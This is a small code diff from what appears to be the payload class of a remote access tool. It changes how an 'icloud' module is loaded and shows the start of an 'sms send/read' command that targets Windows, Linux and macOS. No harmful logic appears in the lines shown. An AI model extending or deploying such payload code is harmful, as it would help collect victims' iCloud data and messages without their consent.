@@ -501,7 +501,7 @@ class Payload():
         
         """
         if 'icloud' not in globals():
-            globals()['icloud'] = self.load('icloud')
+            self.load('icloud')
         return globals()['icloud'].run()
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
